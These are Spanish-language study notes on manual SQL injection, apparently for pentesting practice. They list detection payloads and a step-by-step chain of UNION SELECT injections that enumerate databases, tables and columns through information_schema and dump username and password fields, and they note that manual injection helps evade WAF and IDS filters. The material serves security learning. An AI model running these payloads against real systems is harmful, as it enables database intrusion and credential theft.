# Manual SQL injection

## Ventajas de la inyección sql a mano
- Es más facil de bypasear los filtros de seguridad como WAF o IDS
- obtenemos más control sobre la inyección

[CheatSheets de inyecciones SQL manuales](https://pentestmonkey.net/category/cheat-sheet)

### El orden es DB => Tabla => Columnas

### Detección
- Primero verificamos si la aplicación es vulnerable a inyección sql con payloads como: `' or 1=1--`, o si no `-- +` o `#`
- Si la aplicación es vulnerable, podemos usar `UNION SELECT` para obtener información de otras tablas
- Si la aplicación no es vulnerable a `UNION SELECT`, podemos usar `ORDER BY` para obtener información de otras tablas
    - `ORDER BY` nos permite ordenar los resultados de una consulta SQL
- `10' union select 1,2,3,4,5,6 -- -`
    - Entonces tenemos la consulta:
        - **10**: es el id de la consulta legitima
        - **'**: es el delimitador de la consulta que hace que la consulta se rompa
        - **union select**: es la parte que nos permite unir dos consultas
        - **1,2,3,4,5,6**: son los valores que queremos obtener de la segunda consulta
- Partiendo de `10' union select 1, X,3,4,5,6 -- - ` podemos hacer otro tipo de consultas como que db usa, etc.
    - `10' union select 1, database(),3,4,5,6 -- -`
- Si quiero listar **TODAS las bases de datos**:
    - `10' union select 1, schema_name,3,4,5,6 from information_schema.schemata -- -`
- Ahora por ejemplo si queremos saber que tablas hay en la base de datos podemos hacer:
    - `10' union select 1, table_name,3,4,5,6 from information_schema.tables where table_schema=database() -- -`
    - Para ver todas las tablas de una base de datos:
    - `10' union select 1, table_name,3,4,5,6 from information_schema.tables where table_schema='NOMBRE_BASE_DE_DATOS' -- -`
    - Para ver todas las columnas de una tabla:
        - `10' union select 1, column_name,3,4,5,6 from information_schema.columns where table_name='NOMBRE_TABLA' -- -`
      - Ahora para dumpear la información de la tabla podemos hacer:
        - `10' union select 1, column1, column2,4,5,6 from table_name -- -`
      - Ejemplo:
        - `10' union select 1, username, password,4,5,6 from users -- -`
        - `10' union select 1, column1, column2,4,5,6 from database_name.table_name -- -`